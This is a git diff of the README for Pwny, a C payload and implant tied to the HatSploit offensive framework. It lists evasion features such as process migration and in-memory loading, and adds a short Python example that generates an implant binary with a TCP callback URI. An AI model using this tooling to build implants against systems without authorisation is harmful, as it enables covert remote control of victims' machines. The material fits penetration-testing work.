@@ -13,14 +13,14 @@
 
 Pwny is an implementation of an advanced payload written in pure C and designed for portability and extensibility.
 
-This repository contains Pwny, which is supposed to work on **macOS**, **Linux**, **Windows** and **iOS**, but can be ported to almost every POSIX system. Pwny is optimized to work with or without [HatSploit Framework](https://github.com/EntySec/HatSploit).
+This repository contains Pwny, which is supposed to work on *macOS*, *Linux*, *Windows* and *iOS*, but can be ported to almost every POSIX system. Pwny is optimized to work with or without [HatSploit Framework](https://github.com/EntySec/HatSploit).
 
 ## Features
 
-* Portable C code, that can be compiled for a big range of targets.
-* Support for **macOS**, **Linux**, **Windows** and **iOS** targets.
+* Portable C code that can be compiled for a big range of targets.
+* Support for *macOS*, *Linux*, *Windows* and *iOS* targets.
 * Small executable with low resource utilization optimized for embedded systems.
-* Dynamically-extendable, supports loading plugins which extend its functionality.
+* Dynamically-extendable, supports loading plugins (TABs) which extend its functionality.
 * Evasion techniques such as process migration and in-memory loading.
 
 ## Installing
@@ -39,7 +39,7 @@ pip3 install git+https://github.com/EntySec/HatSploit
 make TARGET=<target>
 ```
 
-**NOTE:** For **macOS / iOS** targets you will need to set `SDK` to the desired SDK path before running `make`. For example:
+**NOTE:** For *macOS / iOS* targets you are required to set `SDK` to the desired SDK path before running `make`. For example:
 
 ```
 make TARGET=<target> SDK=<path>
@@ -87,7 +87,7 @@ cmake -DCMAKE_TOOLCHAIN_FILE=<toolchain> -B build
 cmake --build build
 ```
 
-**NOTE:** For **macOS / iOS** targets you will need to set `CMAKE_OSX_SYSROOT` to the desired SDK path with `-D`. For example:
+**NOTE:** For *macOS / iOS* targets you are required to set `CMAKE_OSX_SYSROOT` to the desired SDK path with `-D`. For example:
 
 ```shell
 cmake -DCMAKE_TOOLCHAIN_FILE=<toolchain> -DCMAKE_OSX_SYSROOT=<path> -B build
@@ -111,22 +111,21 @@ from pwny import Pwny
 from pwny.session import PwnySession
 ```
 
-* `Pwny` - Pwny utilities, mostly for generating payloads.
-* `PwnySession` - Wrapper for `HatSploitSession` for Pwny, HatSploit should use it with Pwny payload.
+* `Pwny` - Pwny object that is used to generate payload implant.
 
-## Executing Pwny
+```python3
+pwny = Pwny(
+    target='aarch64-apple-darwin',
+    options={
+        'uri': 'tcp://127.0.0.1:8888'
+    }
+)
 
-Pwny is an advanced payload that may be loaded in-memory, so all you need to do is to build Pwny, place the DLL (for Windows) or executable (for other OS) to `pwny/templates/<target>.bin` and then generate the loader from `payloads/`. After this, all you need to do is to set up the listener on attacker's machine and execute the generated loader on the target.
+with open('payload.exe', 'wb') as f:
+    f.write(pwny.to_binary())
+```
 
-You can find examples of listeners at `examples/`.
-
-**NOTE:** To generate loader, you should use [`hsfgen`](https://docs.hatsploit.com/docs/getting-started/using-hsfgen), just make sure that payload is either `<platform>/<arch>/pwny_reverse_tcp` or `<platform>/<arch>/pwny_bind_tcp`. 
-
-## Testing Pwny
-
-To test Pwny, simply compile `src/main/test.c` (do not forget to change host and port in it) and then execute `examples/listener.py` on attacker and compiled Pwny on target with command-line arguments like `<host> <port>`.
-
-**NOTE:** No loader is needed for testing, do not overcomplicate it! To disable in-memory loading add `loader=False` to `open()` in `examples/listener.py`.
+* `PwnySession` - Wrapper for `HatSploitSession` for Pwny, HatSploit should use it with Pwny payload. It might also be used without HatSploit as demonstrated in `examples/listener.py`.
 
 ## Projects
 
